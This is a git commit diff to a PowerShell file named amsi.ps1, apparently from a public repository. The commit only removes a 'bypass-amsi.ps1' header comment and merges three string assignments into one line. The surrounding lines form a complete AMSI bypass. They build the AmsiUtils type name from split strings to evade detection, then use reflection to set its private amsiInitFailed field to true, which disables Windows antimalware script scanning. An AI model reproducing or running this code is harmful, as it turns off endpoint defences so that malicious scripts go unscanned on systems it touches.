7474b1c8b69ec9366643e6b5497520cd0bf5dc18
al1z4deh <90620429+al1z4deh@users.noreply.github.com>
2024-07-16 15:15:05 +0400

    Update amsi.ps1

--- amsi.ps1
+++ amsi.ps1
@@ -1,8 +1,4 @@
-# bypass-amsi.ps1
-
-$w = 'System.Management.Automation.A'
-$c = 'si'
-$m = 'Utils'
+$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'
 $assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))
 $field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static')
 $field.SetValue($null,$true)
